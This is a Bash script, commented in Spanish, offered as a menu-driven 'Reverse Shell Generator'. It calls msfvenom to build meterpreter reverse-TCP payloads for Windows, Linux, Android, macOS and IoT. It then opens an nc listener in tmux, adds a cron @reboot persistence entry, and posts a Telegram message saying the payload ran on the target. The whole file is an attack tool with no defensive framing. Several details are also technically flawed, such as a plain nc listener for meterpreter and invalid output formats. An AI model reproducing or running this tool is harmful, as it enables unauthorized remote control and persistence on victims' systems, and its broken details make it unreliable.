
#!/bin/bash

# Colores
GREEN="\e[32m"
RED="\e[31m"
CYAN="\e[36m"
RESET="\e[0m"

SESSION_LOG="session.log"

# Verificar dependencias
check_dependencies() {
    echo -e "${CYAN}[INFO] Verificando dependencias...${RESET}"
    required=("bash" "curl" "wget" "python3" "msfvenom" "tmux")
    for dep in "${required[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${RED}[ERROR] Falta dependencia: $dep. Instalando...${RESET}"
            sudo apt-get install -y $dep || echo -e "${RED}[ERROR] No se pudo instalar $dep${RESET}"
        else
            echo -e "${GREEN}[OK] $dep está instalado.${RESET}"
        fi
    done
}

# Generador de Payload
generate_payload() {
    echo -e "${CYAN}[INFO] Generando payload...${RESET}"
    read -p "Ingrese la IP de conexión reversa: " lhost
    read -p "Ingrese el puerto de conexión reversa: " lport
    echo -e "${CYAN}Seleccione el sistema objetivo:${RESET}"
    echo -e "1. Windows
2. Linux
3. Android
4. macOS
5. IoT"
    read -p "Opción: " target

    case $target in
        1) payload="windows/x64/meterpreter_reverse_tcp" ; ext="exe" ;;
        2) payload="linux/x64/meterpreter_reverse_tcp" ; ext="elf" ;;
        3) payload="android/meterpreter/reverse_tcp" ; ext="apk" ;;
        4) payload="osx/x64/meterpreter_reverse_tcp" ; ext="macho" ;;
        5) payload="generic/shell_reverse_tcp" ; ext="bin" ;;
        *) echo -e "${RED}[ERROR] Opción inválida.${RESET}" ; return ;;
    esac

    msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $ext -o payload.$ext
    echo -e "${GREEN}[SUCCESS] Payload generado: payload.$ext${RESET}"
    start_reverse_shell $lhost $lport
}

# Configurar e iniciar shell reverso
start_reverse_shell() {
    local lhost=$1
    local lport=$2

    echo -e "${CYAN}[INFO] Iniciando consola de acceso (reverse shell)...${RESET}"
    tmux new-session -d -s reverse_shell_session "nc -lvnp $lport"
    tmux attach-session -t reverse_shell_session
}

# Continuar sesión previa
resume_session() {
    if tmux has-session -t reverse_shell_session 2>/dev/null; then
        echo -e "${CYAN}[INFO] Restaurando la sesión previa...${RESET}"
        tmux attach-session -t reverse_shell_session
    else
        echo -e "${RED}[ERROR] No hay una sesión previa para restaurar.${RESET}"
    fi
}

# Persistencia básica
setup_persistence() {
    echo -e "${CYAN}[INFO] Configurando persistencia...${RESET}"
    cronjob="@reboot /path/to/payload"
    (crontab -l 2>/dev/null; echo "$cronjob") | crontab -
    echo -e "${GREEN}[SUCCESS] Persistencia configurada.${RESET}"
}

# Notificaciones en Telegram y Discord
send_notifications() {
    echo -e "${CYAN}[INFO] Configurando notificaciones...${RESET}"
    read -p "Ingrese su token de Telegram: " telegram_token
    read -p "Ingrese su ID de chat: " chat_id
    message="Payload ejecutado exitosamente en el objetivo."
    curl -s -X POST "https://api.telegram.org/bot${telegram_token}/sendMessage" -d "chat_id=${chat_id}&text=${message}"
    echo -e "${GREEN}[SUCCESS] Notificación enviada a Telegram.${RESET}"
}

# Interfaz gráfica básica
gui_interface() {
    zenity --info --text="Bienvenido al Generador de Payloads" --width=300
}

# Menú principal
main_menu() {
    while true; do
        clear
        echo -e "${GREEN}======================================"
        echo -e "       Reverse Shell Generator"
        echo -e "======================================${RESET}"
        echo -e "1. Verificar dependencias"
        echo -e "2. Generar payload"
        echo -e "3. Configurar persistencia"
        echo -e "4. Configurar notificaciones"
        echo -e "5. Continuar sesión previa"
        echo -e "6. Interfaz gráfica (experimental)"
        echo -e "7. Salir"
        read -p "Seleccione una opción: " option

        case $option in
            1) check_dependencies ;;
            2) generate_payload ;;
            3) setup_persistence ;;
            4) send_notifications ;;
            5) resume_session ;;
            6) gui_interface ;;
            7) echo -e "${CYAN}Saliendo...${RESET}" ; exit 0 ;;
            *) echo -e "${RED}[ERROR] Opción inválida.${RESET}" ;;
        esac
        read -p "Presione Enter para continuar..."
    done
}

# Iniciar script
main_menu
